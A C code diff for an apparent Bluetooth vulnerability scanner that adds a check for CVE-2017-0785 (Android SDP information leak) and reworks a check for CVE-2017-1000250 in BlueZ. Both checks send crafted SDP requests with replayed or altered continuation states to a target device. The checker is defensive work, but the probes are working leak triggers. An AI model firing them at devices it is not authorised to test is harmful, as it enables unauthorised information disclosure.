@@ -60,7 +60,7 @@ char * create_sdp_svc_search_pdu(uint16_t service, char *continuation, size_t co
     sdp_pdu_hdr_t *pdu_header = (sdp_pdu_hdr_t *) pdu;
     pdu_header->pdu_id = SDP_SVC_SEARCH_REQ;
     pdu_header->tid = TRANSACTION_ID;
-    pdu_header->plen = htons(SDP_PDU_ATTR_PARAM_LEN + continuation_len);
+    pdu_header->plen = htons(SDP_PDU_SVC_PARAM_LEN + continuation_len);
     // Create a PDU data element with the service search pattern
     sdp_data_uuid16_t *sdp_pdu_data = (sdp_data_uuid16_t *) (pdu + sizeof(sdp_pdu_hdr_t));
     sdp_pdu_data->dtd = TID_SEQ_UINT8;
@@ -72,9 +72,10 @@ char * create_sdp_svc_search_pdu(uint16_t service, char *continuation, size_t co
     *max_service_record = htons(0x0100);
 
     char *continuation_state = (char *) (pdu + sizeof(sdp_pdu_hdr_t) + sizeof(sdp_data_uuid16_t) + sizeof(uint16_t));
-    if (continuation_len > 1)
+    if (continuation_len > 0)
     {
-        memcpy(continuation_state, continuation, continuation_len);
+        continuation_state[0] = continuation_len;
+        memcpy(continuation_state + sizeof(uint8_t), continuation, continuation_len);
     } else {
         *continuation_state = 0x00;
     }
@@ -82,7 +83,34 @@ char * create_sdp_svc_search_pdu(uint16_t service, char *continuation, size_t co
     return pdu;
 }
 
-int extract_cont_state_from_sdp(sdp_cont_state_bluez_t *cont_state, char *pdu)
+int extract_android_cont_state_from_sdp(char *cont_state, char *pdu)
+{
+    sdp_pdu_hdr_t *pdu_header = (sdp_pdu_hdr_t *) pdu;
+    uint8_t svc_search_attr_rsp = SDP_SVC_SEARCH_RSP;
+    size_t offset = 0;
+    if (pdu_header->pdu_id != svc_search_attr_rsp)
+        return -1;
+
+    offset += sizeof(sdp_pdu_hdr_t) + sizeof(uint16_t);
+    uint16_t *current_service_record_count = (uint16_t *) (pdu + offset);
+    *current_service_record_count = ntohs(*current_service_record_count);
+
+    offset += sizeof(uint16_t) + (*current_service_record_count * L2CAP_SVC_UUID_LEN);
+    uint8_t *cont_state_len = (uint8_t *) (pdu + offset);
+
+    if (*cont_state_len != 2)
+        return -1;
+
+    offset += sizeof(uint8_t);
+    char *cont_state_ptr = (char *) (pdu + offset);
+
+    memcpy(cont_state, cont_state_ptr, *cont_state_len);
+
+    return *cont_state_len;
+}
+
+
+int extract_bluez_cont_state_from_sdp(sdp_cont_state_bluez_t *cont_state, char *pdu)
 {
     sdp_pdu_hdr_t *pdu_header = (sdp_pdu_hdr_t *) pdu;
     uint8_t svc_search_attr_rsp = SDP_SVC_SEARCH_ATTR_RSP;
@@ -94,6 +122,8 @@ int extract_cont_state_from_sdp(sdp_cont_state_bluez_t *cont_state, char *pdu)
     *attr_list_byte_count = ntohs(*attr_list_byte_count);
     offset += *attr_list_byte_count + sizeof(uint16_t);
     uint8_t *cont_state_len = (uint8_t *) (pdu + offset);
+    if (*cont_state_len != SDP_BLUEZ_CONT_STATE_LEN)
+        return -1;
     char cont_state_value[*cont_state_len];
     offset += sizeof(uint8_t);
     memcpy(cont_state_value, (pdu + offset), *cont_state_len);
@@ -118,19 +148,18 @@ int is_valid_address(char *address)
     return bachk(address) >= 0;
 }
 
-int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
+int is_vulnerable_to_cve_2017_0785(bdaddr_t *target)
 {
     struct sockaddr_l2 addr = { 0 };
     int sd;
-    uint8_t continuation_len = 0, svc_search_attr_rsp = SDP_SVC_SEARCH_ATTR_RSP;
-    int16_t mtu = MTU;
-    char *pdu, cont_state_s[9], buf[MTU] = { 0 };
-    sdp_cont_state_bluez_t cont_state = { 0 };
+    uint8_t continuation_len = 0;
+    int16_t mtu = MTU, svc_search_rsp = SDP_SVC_SEARCH_RSP;
+    char *pdu, cont_state[3] = { 0 }, buf[MTU] = { 0 };
     sdp_pdu_hdr_t *pdu_header;
-
+    
     // Return a negative integer indicating failure to create socket
     if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
-        return -1;
+        return CVE_CHECK_ERR;
     // Reduce the size of the incoming and outgoing MTU to force the use of a continuation state
     if (set_l2cap_mtu(sd, mtu) < 0)
         return CVE_CHECK_ERR;
@@ -139,6 +168,65 @@ int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
     addr.l2_family = AF_BLUETOOTH;
     addr.l2_psm = htobs(1);
 
+    // Create inital SDP service search PDU
+    pdu = create_sdp_svc_search_pdu(SVC_L2CAP, 0x00, continuation_len);
+
+    if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+        return CVE_CHECK_ERR;
+    // Send initial PDU
+    if (write(sd, pdu, SDP_PDU_SVC_PARAM_LEN + sizeof(sdp_pdu_hdr_t)) < 0)
+        return CVE_CHECK_ERR;
+    // Wait for fragmented response
+    if (read(sd, buf, MTU) < 0)
+        return CVE_CHECK_ERR;
+
+    // Extract continuation state.  If the continuation state is not extracted, it is a Bluetooth 
+    // stack that is not vulnerable
+    if ((continuation_len = extract_android_cont_state_from_sdp(cont_state, buf)) < 0)
+        return 0;
+    
+    free(pdu);
+
+    // Create a new service search PDU directed at a different service with the same continuation state
+    pdu = create_sdp_svc_search_pdu(SVC_SDP, cont_state, continuation_len);
+
+    if (write(sd, pdu, SDP_PDU_SVC_PARAM_LEN + sizeof(sdp_pdu_hdr_t) + continuation_len) == UINT8_ERR)
+        return CVE_CHECK_ERR;
+    if (read(sd, buf, MTU) < 0)
+        return CVE_CHECK_ERR;
+
+    pdu_header = (sdp_pdu_hdr_t *) buf;
+
+    // Cleanup
+    free(pdu);
+    close(sd);
+
+    // If the response is a SDP_SVC_SEARCH_RSP PDU, the device is vulnerable
+    return (pdu_header->pdu_id != svc_search_rsp) ? 0 : 1;
+}
+
+int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
+{
+    struct sockaddr_l2 addr = { 0 };
+    int sd;
+    uint8_t continuation_len = 0, svc_search_attr_rsp = SDP_SVC_SEARCH_ATTR_RSP;
+    int16_t mtu = MTU;
+    char *pdu, cont_state_s[SDP_BLUEZ_CONT_STATE_LEN + 1], buf[MTU] = { 0 };
+    sdp_cont_state_bluez_t cont_state = { 0 };
+    sdp_pdu_hdr_t *pdu_header;
+
+    // Return a negative integer indicating failure to create socket
+    if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
+        return CVE_CHECK_ERR;
+    // Reduce the size of the incoming and outgoing MTU to force the use of a continuation state
+    if (set_l2cap_mtu(sd, mtu) < 0)
+        return CVE_CHECK_ERR;
+
+    addr.l2_bdaddr = *target;
+    addr.l2_family = AF_BLUETOOTH;
+    addr.l2_psm = htobs(1);
+
+    // Create initial SDP Service Attribute Search request
     pdu = create_sdp_svc_attr_search_pdu(SVC_L2CAP, 0x00, continuation_len);
 
     if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
@@ -149,9 +237,10 @@ int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
     // Wait for fragmented response
     if (read(sd, buf, MTU) < 0)
         return CVE_CHECK_ERR;
-    // Extract continuation state
-    if ((continuation_len = extract_cont_state_from_sdp(&cont_state, buf)) < 0)
-        return CVE_CHECK_ERR;
+    // Extract continuation state.  If the continuation state is not extracted, it is a Bluetooth 
+    // stack that is not vulnerable
+    if ((continuation_len = extract_bluez_cont_state_from_sdp(&cont_state, buf)) == UINT8_ERR)
+        return 0;
 
     // Alter the last index of bytes the server sent
     cont_state.cStateValue.lastIndexSent = 0xffff;
@@ -168,8 +257,8 @@ int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
     
     if (read(sd, buf, MTU) < 0)
         return CVE_CHECK_ERR;
-
-    pdu_header = (char *) buf;
+    
+    pdu_header = (sdp_pdu_hdr_t *) buf;
     // Cleanup
     free(pdu);
     close(sd);
